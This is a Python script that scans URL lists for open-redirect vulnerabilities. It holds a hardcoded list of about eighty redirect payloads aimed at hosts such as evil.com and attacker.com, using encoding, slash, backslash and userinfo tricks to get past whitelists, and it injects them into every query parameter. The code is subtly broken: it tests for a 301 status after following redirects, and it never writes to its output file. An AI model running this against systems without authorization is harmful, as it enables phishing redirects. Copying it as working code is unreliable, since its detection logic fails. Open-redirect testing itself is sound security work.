import argparse
import requests
from urllib.parse import urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore

# Initialize colorama
init(autoreset=True)

# Hardcoded payloads with corresponding keywords to verify the redirect
payloads = [
    ("https://example.com", "Example Domain"),
    ("//example.com", "Example Domain"),
    ("/\\example.com", "Example Domain"),
    ("https://evil.com", "Evil"),
    ("//evil.com", "Evil"),
    ("/\\evil.com", "Evil"),
    ("https://malicious.com", "Malicious"),
    ("//malicious.com", "Malicious"),
    ("/\\malicious.com", "Malicious"),
    ("https://attacker.com", "Attacker"),
    ("//attacker.com", "Attacker"),
    ("/\\attacker.com", "Attacker"),
    ("https://www.google.com", "Google"),
    ("https://www.google.com@evil.com", "Evil"),
    ("https://www.google.com%00@evil.com", "Evil"),
    ("https://www.google.com%2Fevil.com", "Evil"),
    ("https://127.0.0.1", "localhost"),
    ("https://0.0.0.0", "localhost"),
    ("https://[::1]", "localhost"),
    ("https://example.com%3Fevil.com", "Example Domain"),
    ("https://evil.com/?q=https://example.com", "Evil"),
    ("//localhost", "localhost"),
    ("//127.0.0.1", "localhost"),
    ("https://example.com?.evil.com", "Example Domain"),
    ("https://example.com?redirect=https://evil.com", "Evil"),
    ("https://evil.com%23example.com", "Evil"),
    # Additional payloads
    ("/%09/example.com", "Example Domain"),
    ("/%2f%2fexample.com", "Example Domain"),
    ("/%2f%2f%2fbing.com%2f%3fwww.omise.co", "Bing"),
    ("/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/", "Google"),
    ("/%5cexample.com", "Example Domain"),
    ("/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d", "Google"),
    ("/.example.com", "Example Domain"),
    ("//%09/example.com", "Example Domain"),
    ("//%5cexample.com", "Example Domain"),
    ("///%09/example.com", "Example Domain"),
    ("///%5cexample.com", "Example Domain"),
    ("////%09/example.com", "Example Domain"),
    ("////%5cexample.com", "Example Domain"),
    ("/////example.com", "Example Domain"),
    ("/////example.com/", "Example Domain"),
    ("////\\;@example.com", "Example Domain"),
    ("////example.com/", "Example Domain"),
    ("////example.com/%2e%2e", "Example Domain"),
    ("////example.com/%2e%2e%2f", "Example Domain"),
    ("////example.com/%2f%2e%2e", "Example Domain"),
    ("////example.com/%2f..", "Example Domain"),
    ("////example.com//", "Example Domain"),
    ("///\\;@example.com", "Example Domain"),
    ("///example.com", "Example Domain"),
    ("///example.com/", "Example Domain"),
    ("//google.com/%2f..", "Google"),
    ("//www.whitelisteddomain.tld@google.com/%2f..", "Google"),
    ("///google.com/%2f..", "Google"),
    ("///www.whitelisteddomain.tld@google.com/%2f..", "Google"),
    ("////google.com/%2f..", "Google"),
    ("////www.whitelisteddomain.tld@google.com/%2f..", "Google"),
    ("https://google.com/%2f..", "Google"),
    ("https://www.whitelisteddomain.tld@google.com/%2f..", "Google"),
    ("/https://google.com/%2f..", "Google"),
    ("/https://www.whitelisteddomain.tld@google.com/%2f..", "Google"),
    ("//www.google.com/%2f%2e%2e", "Google"),
    ("//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e", "Google"),
    ("///www.google.com/%2f%2e%2e", "Google"),
    ("///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e", "Google"),
    ("////www.google.com/%2f%2e%2e", "Google"),
    ("////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e", "Google"),
    ("https://www.google.com/%2f%2e%2e", "Google"),
    ("https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e", "Google"),
    ("/https://www.google.com/%2f%2e%2e", "Google"),
    ("/https://www.whitelisteddomain.tld@www.google.com/%2f%2e%2e", "Google"),
    ("//google.com/", "Google"),
    ("//www.whitelisteddomain.tld@google.com/", "Google"),
    ("///google.com/", "Google"),
    ("///www.whitelisteddomain.tld@google.com/", "Google"),
    ("////google.com/", "Google"),
    ("////www.whitelisteddomain.tld@google.com/", "Google"),
    ("https://google.com/", "Google")
]

# Function to check for open redirects
def check_redirect(url, param, payload, keyword):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Replace the param value with the payload
    query_params[param] = payload
    new_query = urlencode(query_params, doseq=True)
    new_url = parsed_url._replace(query=new_query).geturl()

    try:
        response = requests.get(new_url, allow_redirects=True)
        
        # First check: ensure we got a 301 redirect status code
        if response.status_code == 301:
            # Check if redirected to the payload target by looking for the keyword
            if keyword in response.text:
                return True, f"URL with the injected payload redirected to {payload}"
    except requests.RequestException as e:
        return None, f"Error testing {new_url}: {e}"
    
    return False, f"URL did not redirect as expected: {new_url}"

# Function to process each URL
def process_url(url):
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # If no parameters, return
    if not query_params:
        return

    # Test each parameter separately
    for param in query_params:
        for payload, keyword in payloads:
            is_vulnerable, result = check_redirect(url, param, payload, keyword)
            if is_vulnerable:
                print(Fore.GREEN + f"[VULNERABLE] {result}")
            else:
                print(Fore.RED + f"[NOT VULNERABLE] {result}")

    return

# Main function
def main(input_file, output_file, threads):
    with open(input_file, "r") as f:
        urls = [line.strip() for line in f.readlines()]

    with open(output_file, "w") as f, ThreadPoolExecutor(max_workers=threads) as executor:
        for url in urls:
            executor.submit(process_url, url)

    print(Fore.CYAN + f"\nResults processing complete.")

# Argument parser setup
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Open Redirect Vulnerability Automation")
    parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
    parser.add_argument("-o", "--output", required=True, help="Output file for results")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads (default: 1)")

    args = parser.parse_args()
    main(args.input, args.output, args.threads)
